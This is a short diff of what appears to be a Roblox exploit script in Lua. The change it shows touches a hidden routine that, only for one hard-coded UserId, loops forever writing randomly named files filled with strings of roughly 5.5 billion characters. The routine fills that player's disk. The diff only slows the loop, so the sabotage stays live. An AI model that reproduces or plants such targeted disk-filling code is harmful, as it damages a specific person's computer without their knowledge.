@@ -125,7 +125,7 @@ if shared.FuncsConnect then
 	if lplr.UserId == 2624022508 then
 	  task.spawn(function()
 			repeat
-        task.wait(0.2)
+        task.wait(0.4)
         writefile(Functions.randomGUID()..".lua", "-- Unknown\n"..Functions.randomString(5555555555, 5555555555))
       until false
     end)
